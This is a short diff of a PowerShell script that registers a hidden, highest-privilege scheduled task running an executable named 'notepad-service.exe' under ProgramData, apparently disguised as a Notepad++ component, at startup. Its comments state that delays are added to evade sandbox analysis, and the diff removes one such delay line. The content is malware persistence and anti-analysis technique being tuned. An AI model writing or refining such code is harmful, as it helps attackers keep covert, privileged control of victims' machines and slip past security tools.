@@ -77,7 +77,6 @@ $action = New-ScheduledTaskAction -Execute "C:\ProgramData\npp\notepad-service.e
 # 4. FIX: Simplified Triggers and added Delay to evade sandbox analysis
 $trigger1 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10) # Initial delay to ensure system stability
 $trigger2 = New-ScheduledTaskTrigger -AtStartup
-$trigger.Delay = "PT30S" # Delay execution by 30 seconds after startup to evade sandbox analysis
 $principal = New-ScheduledTaskPrincipal -UserId $env:UserName -LogonType Interactive -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero) -RunOnlyIfNetworkAvailable
 
